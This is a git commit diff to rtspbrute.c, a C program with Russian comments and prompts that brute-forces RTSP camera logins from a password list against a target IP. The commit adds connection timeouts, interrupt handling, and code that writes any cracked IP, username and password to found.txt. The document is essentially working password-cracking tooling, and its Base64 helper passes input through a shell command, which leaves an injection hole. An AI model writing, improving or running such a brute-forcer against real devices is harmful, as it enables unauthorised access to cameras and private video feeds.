ffa82654d80f2773dadc8fd73b259f7242750fc4
Dr <146625050+AnonimusShamshiAlex@users.noreply.github.com>
2025-04-22 20:30:02 +0500

    Update rtspbrute.c

--- rtspbrute.c
+++ rtspbrute.c
@@ -3,11 +3,22 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <fcntl.h>
+#include <sys/select.h>
+#include <signal.h>
 
 #define BUFFER_SIZE 2048
 #define PASSWORD_LENGTH 100
 
-// Функция для кодирования в Base64 через системный вызов (Termux-friendly)
+volatile int running = 1;
+
+// Обработка SIGINT (Ctrl+C)
+void handle_sigint(int sig) {
+    printf("\n\033[1;33m[!] Прерывание... Завершаем.\033[0m\n");
+    running = 0;
+}
+
+// Кодирование Base64 через системную команду
 char *base64_encode(const char *input) {
     char command[BUFFER_SIZE];
     char *result = malloc(BUFFER_SIZE);
@@ -28,7 +39,35 @@ char *base64_encode(const char *input) {
     return result;
 }
 
-// Функция для брутфорса одного пароля
+// Подключение с таймаутом
+int connect_with_timeout(int sockfd, struct sockaddr *addr, int timeout_sec) {
+    fcntl(sockfd, F_SETFL, O_NONBLOCK);
+    int res = connect(sockfd, addr, sizeof(*addr));
+    if (res < 0) {
+        fd_set fdset;
+        struct timeval tv;
+
+        FD_ZERO(&fdset);
+        FD_SET(sockfd, &fdset);
+        tv.tv_sec = timeout_sec;
+        tv.tv_usec = 0;
+
+        if (select(sockfd + 1, NULL, &fdset, NULL, &tv) > 0) {
+            int so_error;
+            socklen_t len = sizeof so_error;
+            getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &so_error, &len);
+            if (so_error == 0) {
+                fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) & ~O_NONBLOCK);
+                return 0;
+            }
+        }
+        return -1;
+    }
+    fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) & ~O_NONBLOCK);
+    return 0;
+}
+
+// Попытка авторизации
 int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
     int sock;
     struct sockaddr_in server_addr;
@@ -40,7 +79,6 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
     char *auth_encoded = base64_encode(userpass);
     if (!auth_encoded) return 0;
 
-    // Создаём сокет
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         perror("Ошибка создания сокета");
@@ -52,8 +90,8 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
     server_addr.sin_port = htons(target_port);
     inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
 
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Ошибка подключения");
+    if (connect_with_timeout(sock, (struct sockaddr *)&server_addr, 5) < 0) {
+        printf("\033[1;31m[!] Таймаут подключения к %s\033[0m\n", target_ip);
         close(sock);
         free(auth_encoded);
         return 0;
@@ -71,6 +109,13 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
 
     if (strstr(response, "200 OK")) {
         printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);
+
+        FILE *out = fopen("found.txt", "w");
+        if (out) {
+            fprintf(out, "IP: %s\nЛогин: %s\nПароль: %s\n", target_ip, username, password);
+            fclose(out);
+        }
+
         close(sock);
         free(auth_encoded);
         return 1;
@@ -89,9 +134,11 @@ int main() {
     char username[100];
     char password[PASSWORD_LENGTH];
 
+    signal(SIGINT, handle_sigint);
+
     printf("Введите IP RTSP сервера: ");
     scanf("%63s", target_ip);
-    getchar(); // съедаем лишний Enter
+    getchar();
 
     printf("Введите логин: ");
     fgets(username, sizeof(username), stdin);
@@ -103,17 +150,17 @@ int main() {
         return 1;
     }
 
-    printf("\nНачинаем брутфорс...\n\n");
+    printf("\n\033[1;36m[*] Начинаем брутфорс...\033[0m\n\n");
 
-    while (fgets(password, PASSWORD_LENGTH, file)) {
+    while (fgets(password, PASSWORD_LENGTH, file) && running) {
         password[strcspn(password, "\n")] = 0;
 
         if (rtsp_bruteforce(target_ip, target_port, username, password)) {
-            printf("\n\033[1;34m[*] Пароль найден. Программа завершена.\033[0m\n");
+            printf("\n\033[1;34m[*] Пароль найден. Сохранён в found.txt. Программа завершена.\033[0m\n");
             break;
         }
 
-        sleep(1); // немного подождать, чтобы не заспамить сервер
+        sleep(1);
     }
 
     fclose(file);
